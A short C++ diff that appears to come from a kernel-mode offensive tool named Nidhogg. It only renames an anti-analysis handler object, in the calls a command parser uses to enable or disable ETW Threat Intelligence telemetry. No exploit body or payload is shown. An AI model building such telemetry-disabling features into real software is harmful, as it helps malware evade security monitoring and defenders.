@@ -1,6 +1,6 @@
 #include "pch.h"
 #include "EtwTiParser.h"
-#include "AntiAnalysis.h"
+#include "AntiAnalysisHandler.h"
 
 EtwTiParser::EtwTiParser() {
 	this->optionsSize = 2;
@@ -35,12 +35,12 @@ NTSTATUS EtwTiParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 	switch (commandId) {
 	case Options::Enable:
 	{
-		status = NidhoggAntiAnalysis->EnableDisableEtwTI(true);
+		status = NidhoggAntiAnalysisHandler->EnableDisableEtwTI(true);
 		break;
 	}
 	case Options::Remove:
 	{
-		status = NidhoggAntiAnalysis->EnableDisableEtwTI(false);
+		status = NidhoggAntiAnalysisHandler->EnableDisableEtwTI(false);
 		break;
 	}
 	default:
